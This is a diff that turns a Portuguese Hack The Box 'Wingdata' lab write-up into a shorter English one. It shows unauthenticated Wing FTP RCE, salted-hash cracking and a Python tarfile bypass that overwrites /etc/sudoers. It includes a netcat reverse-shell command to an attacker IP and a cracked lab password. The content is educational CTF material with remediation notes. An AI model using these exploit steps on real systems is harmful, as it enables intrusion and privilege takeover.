@@ -1,315 +1,180 @@
-# Hack The Box — Wingdata
+## Summary
 
-![HTB](https://img.shields.io/badge/Platform-Hack%20The%20Box-green)
-![Difficulty](https://img.shields.io/badge/Difficulty-Easy-blue)
-![OS](https://img.shields.io/badge/OS-Linux-orange)
-![Category](https://img.shields.io/badge/Category-Web%20%7C%20RCE%20%7C%20Privilege%20Escalation-red)
+Wingdata is an Easy Linux machine running **Wing FTP Server v7.4.3**, vulnerable
+to an unauthenticated RCE (CVE-2025-47812) that yields a shell as `wingftp`.
+Local user XML files expose a salted SHA-256 hash that is cracked (custom salt
+`WingFTP`) for SSH access as `wacky`. A sudo-allowed backup script using Python's
+`tarfile` is exploited via a tar extraction bypass (CVE-2025-4517) to overwrite
+`/etc/sudoers` and escalate to **root**.
 
----
+## Machine Information
 
-# Informações da Máquina
+| Name | Difficulty | OS | Platform |
+| --- | --- | --- | --- |
+| Wingdata | Easy | Linux | Hack The Box |
 
-| Nome  | Dificuldade | Plataforma    | OS    |
-| ----- | ---------- | ------------ | ----- |
-| Wingdata | Easy | Hack The Box | Linux |
+## Attack Path
 
----
+1. Initial enumeration with Nmap.
+2. Identify Wing FTP Server v7.4.3.
+3. Exploit unauthenticated RCE (CVE-2025-47812).
+4. Initial shell as `wingftp`.
+5. Local enumeration and credential collection.
+6. Crack a salted hash (custom salt).
+7. SSH access as `wacky`.
+8. sudo enumeration.
+9. Exploit the Python `tarfile` bypass (CVE-2025-4517).
+10. Obtain root.
 
-# Superfície de ataque
+## Reconnaissance
 
-1. Enumeração inicial com Nmap  
-2. Identificação do Wing FTP Server v7.4.3  
-3. Exploração de RCE não autenticado  
-4. Shell inicial como wingftp  
-5. Enumeração local e coleta de credenciais  
-6. Crack de hash com salt custom  
-7. Acesso via SSH como wacky  
-8. Enumeração de sudo  
-9. Exploração de vulnerabilidade no tarfile  
-10. Obtenção de root  
-
----
-
-# Reconhecimento
-
-A enumeração inicial foi realizada com Nmap para identificar serviços expostos na máquina alvo.
+Initial enumeration was performed with **Nmap**.
 
 ```bash
 nmap -sC -sV -A 10.129.29.71
 ```
 
-![Nmap](screenshots/nmap.png)
+Two ports were open: **22 (SSH)** for later access and **80 (HTTP)** as the main
+attack vector.
 
-O scan revelou duas portas abertas:
+## Web Enumeration
 
-- **22 (SSH)** → possível acesso posterior
-- **80 (HTTP)** → principal vetor de ataque
-
-A presença de apenas dois serviços indicava que o caminho provavelmente envolveria exploração web.
-
----
-
-# Enumeração Web
-
-Ao acessar a aplicação web, foi possível observar uma página institucional da empresa Wing Data Solutions.
-
-![Web](screenshots/web.png)
-
-Durante a navegação, foi identificado o painel do **Wing FTP Server Web Client**, onde a versão do software era exibida:
+The web application was a corporate site for "Wing Data Solutions". Browsing
+revealed the **Wing FTP Server Web Client**, which disclosed the version:
 
 ```
 Wing FTP Server v7.4.3
 ```
 
-![WingFTP](screenshots/wingFTP.png)
+The exact version made it possible to search for version-specific
+vulnerabilities.
 
-Isso é extremamente importante, pois permite buscar vulnerabilidades específicas para essa versão.
+## Exploitation — Wing FTP RCE (CVE-2025-47812)
 
----
+Wing FTP Server v7.4.3 is vulnerable to **unauthenticated RCE** via manipulation
+of the `username` parameter on the login endpoint.
 
-# Exploração
-
-Após pesquisar pela versão identificada, foi encontrada uma vulnerabilidade conhecida:
-
-**CVE-2025-47812 — Unauthenticated RCE**
-
-![Exploit DB](screenshots/exploit-db.png)
-
-Essa vulnerabilidade permite execução remota de código sem autenticação através da manipulação do parâmetro `username` no endpoint de login.
-
-Foi utilizado um exploit público em Python:
+A public Python exploit was used, first validating execution with `whoami`:
 
 ```bash
 python3 exploit.py -u http://ftp.wingdata.htb -v
 ```
 
-![whoami](screenshots/whoami.png)
-
-Inicialmente, foi testado com o comando `whoami` para validar a execução remota.
-
-Em seguida, foi utilizado para obter uma reverse shell:
+Then to obtain a reverse shell:
 
 ```bash
 python3 exploit.py -u http://ftp.wingdata.htb -v -c "nc -c sh 10.10.14.233 1337"
 ```
 
-![Exploit](screenshots/exploit.png)
+## Initial Access (User)
 
----
-
-# Acesso Inicial
-
-Foi configurado um listener na máquina atacante:
+A listener was prepared on the attacker machine, and the exploit returned a
+shell as the `wingftp` service user.
 
 ```bash
 nc -nvlp 1337
 ```
 
-![Shell](screenshots/reverse-shell.png)
+## Privilege Escalation
 
-Após executar o exploit, foi obtida uma shell como:
+### Credential collection
 
-```
-wingftp
-```
-
-Esse usuário corresponde ao serviço do Wing FTP Server.
-
----
-
-# Enumeração Local
-
-Com acesso ao sistema, foi iniciada a enumeração manual.
-
-Foi identificado o diretório:
+Local enumeration found user XML files containing password hashes:
 
 ```
 /opt/wftpserver/Data/1/users/
 ```
 
-Nesse diretório existem arquivos XML contendo informações de usuários, incluindo hashes de senha.
-
-O arquivo `wacky.xml` revelou o seguinte hash:
-
-![Hash](screenshots/wacky-hash.png)
+`wacky.xml` exposed a hash:
 
 ```
 32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca
 ```
 
----
+### Cracking the salted hash
 
-# Crack de Credenciais
-
-Inicialmente, o hash não foi quebrado utilizando SHA256 puro.
-
-Após análise, foi identificado que o sistema utilizava um salt fixo:
-
-```
-WingFTP
-```
-
-O cracking foi realizado com:
+Plain SHA-256 failed; the system used the fixed salt `WingFTP`. Hashcat cracked
+it with the salted SHA-256 mode:
 
 ```bash
 hashcat -m 1410 hash.txt /usr/share/wordlists/rockyou.txt
 ```
 
-![Hashcat](screenshots/hashcat.png)
-
-Senha encontrada:
-
 ```
 !#7Blushing^*Bride5
 ```
 
----
-
-# Acesso via SSH
-
-Com a senha obtida, foi possível acessar o sistema via SSH:
+These credentials were reused for a stable SSH session as `wacky`:
 
 ```bash
 ssh wacky@ftp.wingdata.htb
 ```
 
-![SSH](screenshots/ssh.png)
+The user flag lives at `/home/wacky/user.txt`.
 
-Isso fornece uma shell mais estável em comparação com a reverse shell inicial.
+### tarfile bypass (CVE-2025-4517)
 
----
-
-# Flag de Usuário
-
-```bash
-cat user.txt
-```
-
-![User](screenshots/user-flag.png)
-
-```
-621bc7d792d7ae33963b5dc2d2a2216
-```
-
----
-
-# Escalação de Privilégio
-
-A enumeração com `sudo -l` revelou que o usuário podia executar um script como root sem senha:
+`sudo -l` showed `wacky` could run a backup script as root:
 
 ```
 /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *
 ```
 
-Ao analisar o script, foi identificado o uso da função:
+The script extracted archives with `tar.extractall(path=staging_dir, filter="data")`.
+That filter is not fully safe and is bypassable via CVE-2025-4517 using a
+symlink/hardlink combination, allowing arbitrary writes as root.
 
-```python
-tar.extractall(path=staging_dir, filter="data")
-```
-
-Essa função tenta mitigar path traversal, porém não é completamente segura.
-
----
-
-# Vulnerabilidade
-
-Foi identificado o uso do:
-
-**CVE-2025-4517 — Python tarfile bypass**
-
-![CVE](screenshots/cve.png)
-
-Essa vulnerabilidade permite contornar a proteção do `filter="data"` utilizando uma combinação de:
-
-- symlink
-- hardlink
-
-Isso possibilita escrita arbitrária no sistema como root.
-
----
-
-# Exploração da Escalação
-
-Foi utilizado um exploit que:
-
-1. Cria um arquivo `.tar` malicioso  
-2. Utiliza symlink + hardlink para escapar do diretório  
-3. Sobrescreve `/etc/sudoers`  
-4. Adiciona o usuário `wacky` com privilégios totais  
-
-Execução:
+A PoC was used to craft a malicious `.tar` that escapes the directory and
+overwrites `/etc/sudoers`, granting `wacky` full sudo:
 
 ```bash
 python3 /tmp/CVE-2025-4517-POC.py
 ```
 
-![PrivEsc](screenshots/priv-esc.png)
-
-Após a execução, o usuário passou a ter:
-
 ```
 wacky ALL=(ALL) NOPASSWD: ALL
 ```
 
----
-
-# Root Shell
+A root shell was then trivial:
 
 ```bash
 sudo /bin/bash
 ```
 
----
+The root flag lives at `/root/root.txt`.
 
-# Flag Root
+## Vulnerability Analysis
 
-```bash
-cat /root/root.txt
-```
+**Wing FTP RCE (CVE-2025-47812)** — unauthenticated remote code execution via the
+login `username` parameter gave the initial foothold as the `wingftp` service
+user. Fix: upgrade Wing FTP Server and sanitize authentication parameters.
 
-![Root](screenshots/root-flag.png)
+**Exposed credentials** — password hashes were readable in user XML files,
+enabling offline recovery and SSH access. Fix: restrict permissions on
+application data directories and store secrets outside world-readable locations.
 
-```
-102491.....................
-```
+**Python `tarfile` bypass (CVE-2025-4517)** — the `filter="data"` protection was
+bypassed with symlink/hardlink tricks, allowing arbitrary file writes as root.
+Fix: patch Python, validate archive entries against the destination directory,
+and reject symlinks/absolute paths during extraction.
 
----
+**Insecure sudo script** — a root-run script extracted attacker-controlled
+archives without adequate validation, enabling the tarfile bypass. Fix: avoid
+running attacker-influenced input as root and review sudo-allowed scripts
+carefully.
 
-# Vulnerabilidades Identificadas
+## Tools Used
 
-### Wing FTP RCE (CVE-2025-47812)
-Execução remota de código sem autenticação.
+- Nmap
+- Netcat
+- Python3
+- Hashcat
+- SSH
 
-### Credenciais expostas
-Hashes acessíveis em arquivos XML.
+## Key Takeaways
 
-### Tarfile bypass (CVE-2025-4517)
-Bypass de proteção usando symlink/hardlink.
-
-### Sudo inseguro
-Execução de script privilegiado sem validação adequada.
-
----
-
-# Ferramentas Utilizadas
-
-- Nmap  
-- Netcat  
-- Python3  
-- Hashcat  
-- SSH  
-
----
-
-# Principais Aprendizados
-
-- Identificação de versão pode acelerar exploração  
-- Hashes podem conter salt custom  
-- Acesso inicial nem sempre é estável → pivot via SSH  
-- Falhas em bibliotecas padrão podem levar a privesc  
-- Scripts em sudo devem ser analisados cuidadosamente  
-
----
-
-# Autor
-https://github.com/ninjaa-exe
+- Version fingerprinting can immediately lead to a known exploit.
+- Hashes may use a custom/fixed salt; identify it before cracking.
+- An unstable reverse shell should be upgraded to SSH when possible.
+- Bugs in standard libraries (like `tarfile`) can directly enable privesc.
+- Scripts allowed via sudo must be reviewed carefully.
